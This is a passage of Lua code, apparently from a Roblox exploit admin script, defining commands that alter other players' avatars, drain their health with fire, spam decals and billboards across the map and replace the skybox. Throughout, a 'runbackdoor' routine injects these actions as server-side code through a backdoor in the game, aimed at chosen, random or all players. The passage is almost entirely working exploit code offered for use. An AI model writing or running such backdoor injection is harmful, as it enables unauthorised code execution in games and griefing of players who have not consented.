                        local character = v.Character
                        if character then
                            local torso = character.Torso
                            if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                local leftShoulder = torso["Left Shoulder"]
                                local rightShoulder = torso["Right Shoulder"]

                                leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                            if v:IsA("Player") and v.Name == "%s" then
                                local character = v.Character
                                if character then
                                    local torso = character.Torso
                                    if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                        local leftShoulder = torso["Left Shoulder"]
                                        local rightShoulder = torso["Right Shoulder"]

                                        leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                            * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                        leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                        rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                            * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                        rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                                    end
                                end
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if backdoor then
			runbackdoor(backdoor, bckd)
		else
			tposelol(targetplr)
		end
	end

	carmm(localPlayer)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("discoavatar", "davi", function(target)
	local presets = {"Bright red", "Bright yellow", "Bright orange", "Bright violet", "Bright blue", "Bright bluish green", "Bright green"}

	local function discoava(player)
		if player and player.Character then
			task.spawn(function()
				while true do
					t(0.5)
					local characterParts = player.Character:GetChildren()
					for _, part in ipairs(characterParts) do
						if part:IsA("BasePart") then
							part.BrickColor = BrickColor.new(presets[math.random(1, #presets)])
						end
					end
				end
			end)
		end
	end

	local players = game:GetService("Players"):GetPlayers()

	if not target or target == "" or target == "me" then
		local localPlayer = game.Players.LocalPlayer
		if localPlayer then
			discoava(localPlayer)
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			discoava(randomPlayer)
		end
	elseif target == "others" then
		local localPlayer = game.Players.LocalPlayer
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				discoava(player)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			discoava(player)
		end
	else
		local found = false
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				discoava(player)
				found = true
				break
			end
		end
		if not found then
		end
	end

	if backdoor then
		local bckd = ""

		if not target or target == "" or target == "me" then
			bckd = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name == "%s" then
                        local character = v.Character
                        if character then
                            while true do
                                t(0.5)
                                for _, part in ipairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.BrickColor = BrickColor.new("%s")
                                    end
                                end
                            end
                        end
                    end
                end
            ]], game.Players.LocalPlayer.Name, presets[math.random(1, #presets)])
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			if randomPlayer then
				bckd = string.format([[
                    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                        if v:IsA("Player") and v.Name == "%s" then
                            local character = v.Character
                            if character then
                                while true do
                                    t(0.5)
                                    for _, part in ipairs(character:GetChildren()) do
                                        if part:IsA("BasePart") then
                                            part.BrickColor = BrickColor.new("%s")
                                        end
                                    end
                                end
                            end
                        end
                    end
                ]], randomPlayer.Name, presets[math.random(1, #presets)])
			end
		elseif target == "others" then
			bckd = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name ~= "%s" then
                        local character = v.Character
                        if character then
                            while true do
                                t(0.5)
                                for _, part in ipairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.BrickColor = BrickColor.new("%s")
                                    end
                                end
                            end
                        end
                    end
                end
            ]], game.Players.LocalPlayer.Name, presets[math.random(1, #presets)])
		elseif target == "all" then
			bckd = [[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") then
                        local character = v.Character
                        if character then
                            while true do
                                t(0.5)
                                for _, part in ipairs(character:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.BrickColor = BrickColor.new("%s")
                                    end
                                end
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                            if v:IsA("Player") and v.Name == "%s" then
                                local character = v.Character
                                if character then
                                    while true do
                                        t(0.5)
                                        for _, part in ipairs(character:GetChildren()) do
                                            if part:IsA("BasePart") then
                                                part.BrickColor = BrickColor.new("%s")
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    ]], player.Name, presets[math.random(1, #presets)])
					break
				end
			end
		end

		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("headslide", "hslide", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function headslide(player)
		if player and player.Character and player.Character:FindFirstChild("Torso") then
			for X = 1, math.huge, 0.1 do
				t()
				local neck = player.Character.Torso:FindFirstChild("Neck")
				if neck then
					neck.C0 = CFrame.new(math.sin(X) / 1, 1.5, 0)
					neck.C1 = CFrame.new(0, 0, 0)
				end
			end

			for X = 1, math.huge, 0.07 do
				t()
				local neck = player.Character.Torso:FindFirstChild("Neck")
				if neck then
					neck.C0 = CFrame.new(0, 1.5, 0) * CFrame.fromAxisAngle(Vector3.new(0, 1, 0), X)
					neck.C1 = CFrame.new(0, 0, 0)
				end
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			if localPlayer then
				headslide(localPlayer)
			end
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			if randomPlayer then
				headslide(randomPlayer)
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					headslide(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				headslide(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					headslide(player)
				end
			end
		end
	else
		local bckd = [[
    local players = game:GetService("Players"):GetPlayers()
    local targetPlayers = {}
]]

		local localPlayer = game.Players.LocalPlayer

		if not target or target == "" or target == "me" then
			bckd = bckd .. string.format([[
        local localPlayer = game:GetService("Players"):FindFirstChild("%s")
        if localPlayer then
            table.insert(targetPlayers, localPlayer)
        end
    ]], localPlayer.Name)
		elseif target == "all" then
			bckd = bckd .. [[
        targetPlayers = players
    ]]
		elseif target == "random" then
			bckd = bckd .. [[
        table.insert(targetPlayers, players[math.random(1, #players)])
    ]]
		elseif target == "others" then
			bckd = bckd .. string.format([[
        local localPlayerName = "%s"
        for _, p in pairs(players) do
            if p.Name ~= localPlayerName then
                table.insert(targetPlayers, p)
            end
        end
    ]], localPlayer.Name)
		else
			bckd = bckd .. string.format([[
        local targetName = "%s"
        for _, p in pairs(players) do
            if string.find(string.lower(p.Name), string.lower(targetName)) then
                table.insert(targetPlayers, p)
            end
        end
    ]], target)
		end

		bckd = bckd .. [[
            for _, player in pairs(targetPlayers) do
                if player and player.Character and player.Character:FindFirstChild("Torso") then
                    coroutine.wrap(function()
                        for X = 1, math.huge, 0.1 do
                            t()
                            local neck = player.Character.Torso:FindFirstChild("Neck")
                            if neck then
                                neck.C0 = CFrame.new(math.sin(X) / 1, 1.5, 0)
                                neck.C1 = CFrame.new(0, 0, 0)
                            end
                        end
                    end)()
                end
            end
        ]]

		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("meshdisco", "mdisco", function(target)
	local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	if not backdoor then
		local function mehdisco(player)
			if player and player.Character then
				local character = player.Character
				local parts = {
					Head = character:FindFirstChild("Head"),
					Torso = character:FindFirstChild("Torso"),
					["Left Arm"] = character:FindFirstChild("Left Arm"),
					["Right Arm"] = character:FindFirstChild("Right Arm"),
					["Left Leg"] = character:FindFirstChild("Left Leg"),
					["Right Leg"] = character:FindFirstChild("Right Leg")
				}

				for _, part in pairs(parts) do
					if not part then return end
				end

				for _, part in pairs(parts) do
					if not part:FindFirstChild("Mesh") then
						Instance.new("SpecialMesh", part)
					end
				end

				task.spawn(function()
					while character.Parent do
						t(0.1)
						for _, part in pairs(parts) do
							if part and part:FindFirstChild("Mesh") then
								part.Mesh.MeshType = meshes[math.random(1, #meshes)]
								part.BrickColor = BrickColor.Random()
							end
						end
					end
				end)
			end
		end

		if not target or target == "" or target == "me" then
			mehdisco(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			mehdisco(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					mehdisco(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				mehdisco(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					mehdisco(player)
				end
			end
		end
		return
	end

	local bckd = ""

	if not target or target == "" or target == "me" then
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            if player and player.Character then
                local parts = {
                    Head = player.Character:FindFirstChild("Head"),
                    Torso = player.Character:FindFirstChild("Torso"),
                    ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                    ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                    ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                    ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                }

                for _, part in pairs(parts) do
                    if not part then return end
                end

                for _, part in pairs(parts) do
                    if not part:FindFirstChild("Mesh") then
                        Instance.new("SpecialMesh", part)
                    end
                end

                task.spawn(function()
                    while player.Character and player.Character.Parent do
                        t(0.1)
                        for _, part in pairs(parts) do
                            if part and part:FindFirstChild("Mesh") then
                                part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                part.BrickColor = BrickColor.Random()
                            end
                        end
                    end
                end)
            end
        ]], localPlayerName)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            if player and player.Character then
                local parts = {
                    Head = player.Character:FindFirstChild("Head"),
                    Torso = player.Character:FindFirstChild("Torso"),
                    ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                    ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                    ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                    ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                }

                for _, part in pairs(parts) do
                    if not part then return end
                end

                for _, part in pairs(parts) do
                    if not part:FindFirstChild("Mesh") then
                        Instance.new("SpecialMesh", part)
                    end
                end

                task.spawn(function()
                    while player.Character and player.Character.Parent do
                        t(0.1)
                        for _, part in pairs(parts) do
                            if part and part:FindFirstChild("Mesh") then
                                part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                part.BrickColor = BrickColor.Random()
                            end
                        end
                    end
                end)
            end
        ]], randomPlayer.Name)
	elseif target == "others" then
		bckd = string.format([[
            local localPlayerName = "%s"
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName then
                    if player and player.Character then
                        local parts = {
                            Head = player.Character:FindFirstChild("Head"),
                            Torso = player.Character:FindFirstChild("Torso"),
                            ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                            ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                            ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                            ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                        }

                        for _, part in pairs(parts) do
                            if not part then goto continue end
                        end

                        for _, part in pairs(parts) do
                            if not part:FindFirstChild("Mesh") then
                                Instance.new("SpecialMesh", part)
                            end
                        end

                        task.spawn(function()
                            while player.Character and player.Character.Parent do
                                t(0.1)
                                for _, part in pairs(parts) do
                                    if part and part:FindFirstChild("Mesh") then
                                        part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                        part.BrickColor = BrickColor.Random()
                                    end
                                end
                            end
                        end)
                        
                        ::continue::
                    end
                end
            end
        ]], localPlayerName)
	elseif target == "all" then
		bckd = [[
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player and player.Character then
                    local parts = {
                        Head = player.Character:FindFirstChild("Head"),
                        Torso = player.Character:FindFirstChild("Torso"),
                        ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                        ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                        ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                        ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                    }

                    for _, part in pairs(parts) do
                        if not part then goto continue end
                    end

                    for _, part in pairs(parts) do
                        if not part:FindFirstChild("Mesh") then
                            Instance.new("SpecialMesh", part)
                        end
                    end

                    task.spawn(function()
                        while player.Character and player.Character.Parent do
                            t(0.1)
                            for _, part in pairs(parts) do
                                if part and part:FindFirstChild("Mesh") then
                                    part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                    part.BrickColor = BrickColor.Random()
                                end
                            end
                        end
                    end)
                    
                    ::continue::
                end
            end
        ]]
	else
		bckd = string.format([[
            local targetName = "%s"
            local meshes = {"Brick", "Cylinder", "Head", "Sphere", "Torso", "Wedge"}
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) then
                    if player and player.Character then
                        local parts = {
                            Head = player.Character:FindFirstChild("Head"),
                            Torso = player.Character:FindFirstChild("Torso"),
                            ["Left Arm"] = player.Character:FindFirstChild("Left Arm"),
                            ["Right Arm"] = player.Character:FindFirstChild("Right Arm"),
                            ["Left Leg"] = player.Character:FindFirstChild("Left Leg"),
                            ["Right Leg"] = player.Character:FindFirstChild("Right Leg")
                        }

                        for _, part in pairs(parts) do
                            if not part then goto continue end
                        end

                        for _, part in pairs(parts) do
                            if not part:FindFirstChild("Mesh") then
                                Instance.new("SpecialMesh", part)
                            end
                        end

                        task.spawn(function()
                            while player.Character and player.Character.Parent do
                                t(0.1)
                                for _, part in pairs(parts) do
                                    if part and part:FindFirstChild("Mesh") then
                                        part.Mesh.MeshType = meshes[math.random(1, #meshes)]
                                        part.BrickColor = BrickColor.Random()
                                    end
                                end
                            end
                        end)
                        
                        ::continue::
                    end
                end
            end
        ]], target)
	end

	if bckd ~= "" then
		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("accessoryless", "aless", function(target)
	function settrans(player, transparency)
		if player and player.Character then
			local character = player.Character
			for _, accessory in pairs(character:GetChildren()) do
				if accessory:IsA("Accessory") then
					local handle = accessory:FindFirstChild("Handle")
					if handle then
						handle.Transparency = transparency
					end
				end
			end
		end
	end

	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not target or target == "" or target == "me" then
		if localPlayer then
			settrans(localPlayer, 1)
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		settrans(randomPlayer, 1)
	elseif target == "others" then
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				settrans(player, 1)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			settrans(player, 1)
		end
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				settrans(player, 1)
			end
		end
	end

	if backdoor then
		local bckd = ""

		if not target or target == "" or target == "me" then
			bckd = [[
                local player = game.Players.LocalPlayer
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 1
                            end
                        end
                    end
                end
            ]]
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 1
                            end
                        end
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			bckd = string.format([[
                local localPlayerName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Name ~= localPlayerName then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 1
                                    end
                                end
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        for _, accessory in pairs(player.Character:GetChildren()) do
                            if accessory:IsA("Accessory") then
                                local handle = accessory:FindFirstChild("Handle")
                                if handle then
                                    handle.Transparency = 1
                                end
                            end
                        end
                    end
                end
            ]]
		else
			bckd = string.format([[
                local targetName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if string.find(string.lower(player.Name), string.lower(targetName)) then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 1
                                    end
                                end
                            end
                        end
                    end
                end
            ]], target)
		end

		if bckd ~= "" then
			runbackdoor(backdoor, bckd)
		end
	end
end)

addcommand("unaccessoryless", "unaless", function(target)
	function settrans(player, transparency)
		if player and player.Character then
			local character = player.Character
			for _, accessory in pairs(character:GetChildren()) do
				if accessory:IsA("Accessory") then
					local handle = accessory:FindFirstChild("Handle")
					if handle then
						handle.Transparency = transparency
					end
				end
			end
		end
	end

	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not target or target == "" or target == "me" then
		if localPlayer then
			settrans(localPlayer, 0)
		end
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		settrans(randomPlayer, 0)
	elseif target == "others" then
		for _, player in ipairs(players) do
			if player ~= localPlayer then
				settrans(player, 0)
			end
		end
	elseif target == "all" then
		for _, player in ipairs(players) do
			settrans(player, 0)
		end
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				settrans(player, 0)
			end
		end
	end

	if backdoor then
		local bckd = ""

		if not target or target == "" or target == "me" then
			bckd = [[
                local player = game.Players.LocalPlayer
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 0
                            end
                        end
                    end
                end
            ]]
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			bckd = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    for _, accessory in pairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                handle.Transparency = 0
                            end
                        end
                    end
                end
            ]], randomPlayer.Name)
		elseif target == "others" then
			bckd = string.format([[
                local localPlayerName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Name ~= localPlayerName then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 0
                                    end
                                end
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        for _, accessory in pairs(player.Character:GetChildren()) do
                            if accessory:IsA("Accessory") then
                                local handle = accessory:FindFirstChild("Handle")
                                if handle then
                                    handle.Transparency = 0
                                end
                            end
                        end
                    end
                end
            ]]
		else
			bckd = string.format([[
                local targetName = "%s"
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if string.find(string.lower(player.Name), string.lower(targetName)) then
                        if player.Character then
                            for _, accessory in pairs(player.Character:GetChildren()) do
                                if accessory:IsA("Accessory") then
                                    local handle = accessory:FindFirstChild("Handle")
                                    if handle then
                                        handle.Transparency = 0
                                    end
                                end
                            end
                        end
                    end
                end
            ]], target)
		end

		if bckd ~= "" then
			runbackdoor(backdoor, bckd)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("decalspam", "dspam", function(imageId)
	imageId = imageId

	function removdecalz(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA("Decal") then
				v:Destroy()
			elseif v:IsA("BasePart") then
				for _, child in pairs(v:GetChildren()) do
					if child:IsA("Decal") then
						child:Destroy()
					end
				end
			end
			removdecalz(v)
		end
	end

	local function spam(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA("BasePart") then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://" .. imageId
				Two.Texture = "rbxassetid://" .. imageId
				Three.Texture = "rbxassetid://" .. imageId
				Four.Texture = "rbxassetid://" .. imageId
				Five.Texture = "rbxassetid://" .. imageId
				Six.Texture = "rbxassetid://" .. imageId
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			spam(v)
		end
	end

	local function removdecal(root)
		for _, v in pairs(root:GetChildren()) do
			removdecal(v)
		end
	end

	if not backdoor then
		spawn(function()
			removdecal(game.Workspace)
			spam(game.Workspace)
		end)
	end

	if backdoor then
		local bckd = string.format([[
            local imageId = "%s"

            function removdecalz(root)
                for _, v in pairs(root:GetChildren()) do
                    if v:IsA("Decal") then
                        v:Destroy()
                    elseif v:IsA("BasePart") then
                        for _, child in pairs(v:GetChildren()) do
                            if child:IsA("Decal") then
                                child:Destroy()
                            end
                        end
                    end
                    removdecalz(v)
                end
            end

            function spam(root)
                for _, v in pairs(root:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.Material = "Plastic"
                        local One = Instance.new("Decal", v)
                        local Two = Instance.new("Decal", v)
                        local Three = Instance.new("Decal", v)
                        local Four = Instance.new("Decal", v)
                        local Five = Instance.new("Decal", v)
                        local Six = Instance.new("Decal", v)
                        One.Texture = "rbxassetid://" .. imageId
                        Two.Texture = "rbxassetid://" .. imageId
                        Three.Texture = "rbxassetid://" .. imageId
                        Four.Texture = "rbxassetid://" .. imageId
                        Five.Texture = "rbxassetid://" .. imageId
                        Six.Texture = "rbxassetid://" .. imageId
                        One.Face = "Front"
                        Two.Face = "Back"
                        Three.Face = "Right"
                        Four.Face = "Left"
                        Five.Face = "Top"
                        Six.Face = "Bottom"
                    end
                    spam(v)
                end
            end

            removdecalz(game.Workspace)
            spam(game.Workspace)
        ]], imageId)

		runbackdoor(backdoor, bckd)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("billboardspam", "bbspam", function(imageId)
	imageId = imageId

	function billbord(part)
		if part:FindFirstChildOfClass("BillboardGui") then return end

		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Parent = part
		billboardGui.Adornee = part

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = "rbxassetid://" .. imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui
	end

	local function addbillbord()
		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA("BasePart") then
				billbord(descendant)
			end
		end

		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA("BasePart") then
				billbord(newDescendant)
			end
		end)
	end

	if not backdoor then
		spawn(function()
			addbillbord()
		end)
	end

	if backdoor then
		local bckd = string.format([[
            local imageId = "%s"

            function billbord(part)
                if part:FindFirstChildOfClass("BillboardGui") then return end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Size = UDim2.new(3, 0, 3, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.Parent = part
                billboardGui.Adornee = part

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Image = "rbxassetid://" .. imageId
                imageLabel.BackgroundTransparency = 1
                imageLabel.Parent = billboardGui
            end

            function addbillbord()
                for _, descendant in pairs(workspace:GetDescendants()) do
                    if descendant:IsA("BasePart") then
                        billbord(descendant)
                    end
                end

                workspace.DescendantAdded:Connect(function(newDescendant)
                    if newDescendant:IsA("BasePart") then
                        billbord(newDescendant)
                    end
                end)
            end

            addbillbord()
        ]], imageId)

		runbackdoor(backdoor, bckd)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("replaceskybox", "sky", function(imageId)
	imageId = imageId or ""

	local function repsky()
		local lighting = game:GetService("Lighting")

		local oldSky = lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
			t()
		end

		local sky = Instance.new("Sky")
		sky.SkyboxBk = "rbxassetid://" .. imageId
		sky.SkyboxDn = "rbxassetid://" .. imageId
		sky.SkyboxFt = "rbxassetid://" .. imageId
		sky.SkyboxLf = "rbxassetid://" .. imageId
		sky.SkyboxRt = "rbxassetid://" .. imageId
		sky.SkyboxUp = "rbxassetid://" .. imageId
		sky.Parent = lighting
	end

	if not backdoor then
		spawn(repsky)
	else
		local bckd = string.format([[
            local imageId = "%s"
            
            local lighting = game:GetService("Lighting")
            local oldSky = lighting:FindFirstChildOfClass("Sky")
            if oldSky then
                oldSky:Destroy()
                t()
            end
            
            local sky = Instance.new("Sky")
            sky.SkyboxBk = "rbxassetid://" .. imageId
            sky.SkyboxDn = "rbxassetid://" .. imageId
            sky.SkyboxFt = "rbxassetid://" .. imageId
            sky.SkyboxLf = "rbxassetid://" .. imageId
            sky.SkyboxRt = "rbxassetid://" .. imageId
            sky.SkyboxUp = "rbxassetid://" .. imageId
            sky.Parent = lighting
        ]], imageId)

		runbackdoor(backdoor, bckd)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("fire", "fire", function(target)
	local fyecol = Color3.fromHex("4051ED")
	local secfyecol = Color3.fromHex("99a3ff")
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	if not backdoor then
		local function fiyah(player)
			if player and player.Character then
				local character = player.Character
				local humanoid = character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					for _, part in pairs(character:GetChildren()) do
						if part:IsA("BasePart") then
							for _, existingFire in ipairs(part:GetChildren()) do
								if existingFire:IsA("Fire") then
									existingFire:Destroy()
								end
							end
						end
					end

					for _, part in pairs(character:GetChildren()) do
						if part:IsA("BasePart") then
							local fire = Instance.new("Fire")
							fire.Size = 10
							fire.Heat = 1
							fire.Color = fyecol
							fire.SecondaryColor = secfyecol
							fire.Parent = part
						end
					end

					task.spawn(function()
						while humanoid and humanoid.Health > 0 and character.Parent do
							humanoid.Health = humanoid.Health - 20
							t(0.5)
						end
					end)
				end
			end
		end

		if not target or target == "" or target == "me" then
			fiyah(localPlayer)
		elseif target == "random" then
			if #players > 0 then
				local randomPlayer = players[math.random(1, #players)]
				fiyah(randomPlayer)
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(function() fiyah(player) end)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(function() fiyah(player) end)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					fiyah(player)
					break
				end
			end
		end
		return
	end

	local localPlayerName = localPlayer.Name
	local bckd = ""

	if not target or target == "" or target == "me" then
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            if player and player.Character then
                local character = player.Character
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                
                if humanoid then
